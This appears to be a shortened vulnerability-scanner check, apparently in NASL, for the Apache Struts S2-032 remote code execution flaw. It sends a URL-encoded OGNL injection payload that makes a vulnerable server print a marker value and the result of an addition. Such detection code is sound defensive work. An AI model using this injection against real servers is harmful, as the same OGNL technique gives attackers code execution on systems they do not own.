...
if(description)
{
  ...
  script_version("2021-04-06T11:01:20+0000");
  ...
  script_name("Apache Struts RCE Vulnerability (S2-032) - Active Check");
...
foreach ext(make_list("action", "do" ) ) {
...
foreach url(urls) {
  ...
  postdata = "?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS," +
             ...
             "%28%29%2c%23" + v_a  + ".print%28%23parameters." + v_b + "%5b0%5d%29%2c%23" + v_a +
             ".print%28new%20java.lang.Integer%28" + addend_one + "%2b" + addend_two + "%29%29%2c%23" + v_a + ".print%28%23parameters." +
             v_b + "%5b0%5d%29%2c%23" + v_a + ".close%28%29,1%3f%23xx%3a%23request.toString&" + v_b + "=" + flag;
